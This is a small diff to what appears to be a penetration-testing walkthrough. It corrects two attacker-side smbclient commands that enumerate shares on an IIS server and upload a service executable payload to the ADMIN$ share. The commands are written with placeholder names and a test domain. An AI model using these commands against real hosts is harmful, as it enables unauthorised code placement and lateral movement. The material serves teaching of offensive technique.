@@ -55,13 +55,13 @@ Now, we can upload the payload to the _IIS_ server (`smbclient`), and subsequent
 {% code title="Attacker" overflow="wrap" %}
 ```sh
 # lets first identify the name of the admin share
-$ smbclient -U admin -L '//iis.test.com' -W xxx
+$ smbclient -U admin -L '//iis.test.com' -W test.com
 Sharename       Type      Comment
 ---------       ----      -------
  ADMIN$         Disk      Remote Admin
 ...
 
-$smbclient -c "put <service_exec_name>.exe" -U admin -W xxx '//iis.test.com/admin$/' <password>
+$ smbclient -c "put <service_exec_name>.exe" -U admin -W test.com '//iis.test.com/ADMIN$/' <password>
 ```
 {% endcode %}
 
